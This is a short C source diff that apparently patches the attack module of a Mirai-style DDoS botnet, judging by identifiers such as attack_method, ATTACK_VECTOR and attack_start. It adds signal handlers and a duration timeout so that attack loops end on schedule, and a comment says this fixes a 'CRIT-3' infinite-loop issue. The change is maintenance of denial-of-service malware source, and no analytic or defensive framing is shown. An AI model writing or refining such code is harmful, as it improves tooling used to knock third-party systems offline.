@@ -19,6 +19,44 @@ uint8_t methods_len = 0;
 struct attack_method **methods = NULL;
 int attack_ongoing[ATTACK_CONCURRENT_MAX] = {0};
 
+/* Attack control - added to fix CRIT-3 (infinite loops) */
+volatile sig_atomic_t attack_running = 1;
+static time_t attack_start_time = 0;
+static uint32_t attack_max_duration = 0;
+
+static void attack_signal_handler(int sig)
+{
+    if (sig == SIGTERM || sig == SIGINT) {
+        attack_running = 0;
+    }
+}
+
+void attack_control_init(uint32_t duration)
+{
+    attack_start_time = time(NULL);
+    attack_max_duration = duration;
+    attack_running = 1;
+    
+    signal(SIGTERM, attack_signal_handler);
+    signal(SIGINT, attack_signal_handler);
+}
+
+BOOL attack_should_continue(void)
+{
+    if (!attack_running) {
+        return FALSE;
+    }
+    
+    if (attack_max_duration > 0) {
+        time_t elapsed = time(NULL) - attack_start_time;
+        if (elapsed >= attack_max_duration) {
+            return FALSE;
+        }
+    }
+    
+    return TRUE;
+}
+
 BOOL attack_init(void)
 {
     int i;
@@ -172,6 +210,9 @@ void attack_start(int duration, ATTACK_VECTOR vector, uint8_t targs_len, struct 
     else
     {
         int i;
+
+        /* Initialize attack control before starting */
+        attack_control_init(duration);
 
         for (i = 0; i < methods_len; i++)
         {
